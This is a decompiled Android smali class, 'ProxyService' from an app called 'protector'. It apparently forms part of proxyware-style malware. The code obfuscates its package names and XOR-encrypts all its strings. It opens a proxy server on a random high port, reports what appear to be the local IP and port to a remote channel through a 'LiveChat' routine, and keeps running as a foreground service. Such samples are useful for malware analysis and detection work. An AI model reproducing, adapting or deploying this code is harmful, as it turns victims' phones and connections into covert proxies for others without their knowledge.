.class public Lcom/icontrol/protector/ProxyService;
.super Landroid/app/Service;
.source "SourceFile"


# instance fields
.field private b:Ljava/util/concurrent/ExecutorService;

.field private c:Lntidisestablish/neumonoul/floccinaucinih/rq;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static synthetic a(Lcom/icontrol/protector/ProxyService;Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/ProxyService;->b(Landroid/content/Context;)V

    return-void
.end method

.method private synthetic b(Landroid/content/Context;)V
    .locals 10

    .line 1
    :cond_0
    const/16 v0, 0x7d0

    const/16 v1, 0x2328

    const/4 v2, 0x4

    const/16 v3, 0xc

    const/4 v4, 0x5

    const/16 v5, 0x8

    :try_start_0
    invoke-static {v0, v1}, Lcom/icontrol/protector/n;->W(II)I

    move-result v0

    invoke-static {v0}, Lcom/icontrol/protector/n;->Q(I)Z

    move-result v1

    if-nez v1, :cond_0

    new-instance v1, Lntidisestablish/neumonoul/floccinaucinih/rq;

    invoke-direct {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/rq;-><init>(I)V

    iput-object v1, p0, Lcom/icontrol/protector/ProxyService;->c:Lntidisestablish/neumonoul/floccinaucinih/rq;

    new-array v1, v3, [B

    fill-array-data v1, :array_0

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v1, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v6, 0x1d

    new-array v6, v6, [B

    fill-array-data v6, :array_2

    new-array v7, v5, [B

    fill-array-data v7, :array_3

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/icontrol/protector/n;->I()Ljava/lang/String;

    move-result-object v1

    new-array v6, v3, [B

    fill-array-data v6, :array_4

    new-array v7, v5, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    new-array v7, v5, [B

    fill-array-data v7, :array_6

    new-array v8, v5, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    new-array v7, v4, [B

    fill-array-data v7, :array_8

    new-array v8, v5, [B

    fill-array-data v8, :array_9

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v4, [B

    fill-array-data v8, :array_a

    new-array v9, v5, [B

    fill-array-data v9, :array_b

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v7, v2, [B

    fill-array-data v7, :array_c

    new-array v8, v5, [B

    fill-array-data v8, :array_d

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v1, v4, [B

    fill-array-data v1, :array_e

    new-array v7, v5, [B

    fill-array-data v7, :array_f

    invoke-static {v1, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v6, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-static {p1, v6}, Lcom/icontrol/protector/LiveChat;->i(Landroid/content/Context;Lorg/json/JSONObject;)V

    iget-object v0, p0, Lcom/icontrol/protector/ProxyService;->c:Lntidisestablish/neumonoul/floccinaucinih/rq;

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/rq;->b(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    new-array v1, v3, [B

    fill-array-data v1, :array_10

    new-array v3, v5, [B

    fill-array-data v3, :array_11

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v3, 0x1b

    new-array v3, v3, [B

    fill-array-data v3, :array_12

    new-array v6, v5, [B

    fill-array-data v6, :array_13

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :try_start_1
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    new-array v3, v4, [B

    fill-array-data v3, :array_14

    new-array v6, v5, [B

    fill-array-data v6, :array_15

    invoke-static {v3, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v4, v4, [B

    fill-array-data v4, :array_16

    new-array v6, v5, [B

    fill-array-data v6, :array_17

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v2, [B

    fill-array-data v2, :array_18

    new-array v3, v5, [B

    fill-array-data v3, :array_19

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v4, 0x7

    new-array v4, v4, [B

    fill-array-data v4, :array_1a

    new-array v5, v5, [B

    fill-array-data v5, :array_1b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {p1, v1}, Lcom/icontrol/protector/LiveChat;->i(Landroid/content/Context;Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x7dt
        0x29t
        -0x52t
        0x6at
        0x3dt
        0x3t
        -0x34t
        -0x75t
        0x5bt
        0x32t
        -0x5et
        0x77t
    .end array-data

    :array_1
    .array-data 1
        0x2dt
        0x5bt
        -0x3ft
        0x12t
        0x44t
        0x50t
        -0x57t
        -0x7t
    .end array-data

    :array_2
    .array-data 1
        0x32t
        0x1ct
        -0x6bt
        0xct
        -0x21t
        -0x2et
        -0x4at
        0x0t
        0x10t
        0x18t
        -0x61t
        0x6t
        -0x7at
        -0x7ft
        -0x4ft
        0x4t
        0x10t
        0x1at
        -0x61t
        0x10t
        -0x7at
        -0x63t
        -0x55t
        0x45t
        0x12t
        0x1t
        -0x78t
        0x0t
        -0x7at
    .end array-data

    nop

    :array_3
    .array-data 1
        0x62t
        0x6et
        -0x6t
        0x74t
        -0x5at
        -0xet
        -0x3bt
        0x65t
    .end array-data

    :array_4
    .array-data 1
        -0x6et
        0xat
        -0x29t
        -0x75t
        0x47t
        0x62t
        0x6ct
        0x45t
        -0x4ct
        0x11t
        -0x25t
        -0x6at
    .end array-data

    :array_5
    .array-data 1
        -0x3et
        0x78t
        -0x48t
        -0xdt
        0x3et
        0x31t
        0x9t
        0x37t
    .end array-data

    :array_6
    .array-data 1
        -0x3bt
        -0x3dt
        -0x45t
        -0x6at
        0x42t
        -0x73t
        -0x56t
        -0x6t
    .end array-data

    :array_7
    .array-data 1
        -0x57t
        -0x54t
        -0x28t
        -0x9t
        0x2et
        -0x1ct
        -0x26t
        -0x26t
    .end array-data

    :array_8
    .array-data 1
        -0x15t
        0x63t
        -0x67t
        0x2et
        0x10t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x78t
        0x17t
        -0x20t
        0x5et
        0x75t
        0x45t
        0x79t
        -0x63t
    .end array-data

    :array_a
    .array-data 1
        0xft
        0x28t
        0xet
        0x71t
        0x9t
    .end array-data

    nop

    :array_b
    .array-data 1
        0x69t
        0x41t
        0x7ct
        0x2t
        0x7dt
        -0x7ft
        0x39t
        -0x41t
    .end array-data

    :array_c
    .array-data 1
        0x74t
        0x49t
        -0x5bt
        0x5ft
    .end array-data

    :array_d
    .array-data 1
        0x18t
        0x26t
        -0x34t
        0x2ft
        -0x53t
        -0x6t
        -0x6ct
        0x60t
    .end array-data

    :array_e
    .array-data 1
        0x6ft
        -0x2ct
        0x55t
        -0x69t
        -0x3ct
    .end array-data

    nop

    :array_f
    .array-data 1
        0x1ft
        -0x5ct
        0x3at
        -0x1bt
        -0x50t
        0x48t
        0x6bt
        -0x26t
    .end array-data

    :array_10
    .array-data 1
        -0x52t
        -0x25t
        0x5ct
        0x4at
        0x7t
        0x36t
        0x28t
        -0x4bt
        -0x78t
        -0x40t
        0x50t
        0x57t
    .end array-data

    :array_11
    .array-data 1
        -0x2t
        -0x57t
        0x33t
        0x32t
        0x7et
        0x65t
        0x4dt
        -0x39t
    .end array-data

    :array_12
    .array-data 1
        -0x80t
        0x16t
        0x5dt
        -0x38t
        -0x40t
        -0x42t
        0x40t
        -0x64t
        -0x5ct
        0x16t
        0x5bt
        -0x32t
        -0x24t
        -0x7t
        0x13t
        -0x68t
        -0x49t
        0xbt
        0x57t
        -0x22t
        -0x6et
        -0x13t
        0x56t
        -0x66t
        -0x4dt
        0x1t
        0x5dt
    .end array-data

    :array_13
    .array-data 1
        -0x3bt
        0x64t
        0x2ft
        -0x59t
        -0x4et
        -0x62t
        0x33t
        -0x18t
    .end array-data

    :array_14
    .array-data 1
        0x61t
        -0x67t
        0x7ft
        0x5at
        0x45t
    .end array-data

    nop

    :array_15
    .array-data 1
        0x2t
        -0x13t
        0x6t
        0x2at
        0x20t
        0x51t
        -0x27t
        -0x31t
    .end array-data

    :array_16
    .array-data 1
        -0x51t
        -0x61t
        0x37t
        -0x4ct
        0x38t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x24t
        -0x15t
        0x56t
        -0x40t
        0x5dt
        -0x26t
        -0x42t
        0x60t
    .end array-data

    :array_18
    .array-data 1
        0x22t
        0x5et
        0x12t
        0x9t
    .end array-data

    :array_19
    .array-data 1
        0x51t
        0x33t
        0x61t
        0x6et
        -0x79t
        0x3at
        -0x27t
        0x7bt
    .end array-data

    :array_1a
    .array-data 1
        -0x35t
        -0x49t
        0x72t
        0x79t
        -0x6et
        -0x54t
        -0x7bt
    .end array-data

    :array_1b
    .array-data 1
        -0x72t
        -0x3bt
        0x0t
        0x16t
        -0x20t
        -0x6at
        -0x5bt
        -0x79t
    .end array-data
.end method

.method private c(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->b(Landroid/content/Context;)Lntidisestablish/neumonoul/floccinaucinih/oq;

    move-result-object v0

    invoke-virtual {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/oq;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_0

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    const/4 v1, 0x1

    invoke-static {p0, v0, p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/zu;->a(Lcom/icontrol/protector/ProxyService;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_0
    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->A:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 3

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/16 v0, 0xc

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 v0, 0x17

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    iget-object v0, p0, Lcom/icontrol/protector/ProxyService;->c:Lntidisestablish/neumonoul/floccinaucinih/rq;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/rq;->c()V

    :cond_0
    iget-object v0, p0, Lcom/icontrol/protector/ProxyService;->b:Ljava/util/concurrent/ExecutorService;

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    :cond_1
    return-void

    :array_0
    .array-data 1
        -0x53t
        0x26t
        0x47t
        -0x40t
        0xdt
        -0x7ct
        0x35t
        0x53t
        -0x75t
        0x3dt
        0x4bt
        -0x23t
    .end array-data

    :array_1
    .array-data 1
        -0x3t
        0x54t
        0x28t
        -0x48t
        0x74t
        -0x29t
        0x50t
        0x21t
    .end array-data

    :array_2
    .array-data 1
        -0x2et
        -0x28t
        -0x79t
        0x1et
        -0x57t
        0x52t
        -0x7ct
        0x35t
        -0x3ct
        -0x6at
        -0x1dt
        0xbt
        -0x58t
        0x49t
        -0x72t
        0x23t
        -0x63t
        -0x3bt
        -0x5at
        0x9t
        -0x54t
        0x43t
        -0x7ct
    .end array-data

    :array_3
    .array-data 1
        -0x43t
        -0x4at
        -0x3dt
        0x7bt
        -0x26t
        0x26t
        -0xat
        0x5at
    .end array-data
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object p2

    iput-object p2, p0, Lcom/icontrol/protector/ProxyService;->b:Ljava/util/concurrent/ExecutorService;

    new-instance p3, Lntidisestablish/neumonoul/floccinaucinih/av;

    invoke-direct {p3, p0, p1}, Lntidisestablish/neumonoul/floccinaucinih/av;-><init>(Lcom/icontrol/protector/ProxyService;Landroid/content/Context;)V

    invoke-interface {p2, p3}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/ProxyService;->c(Landroid/content/Context;)V

    const/4 p1, 0x1

    return p1
.end method
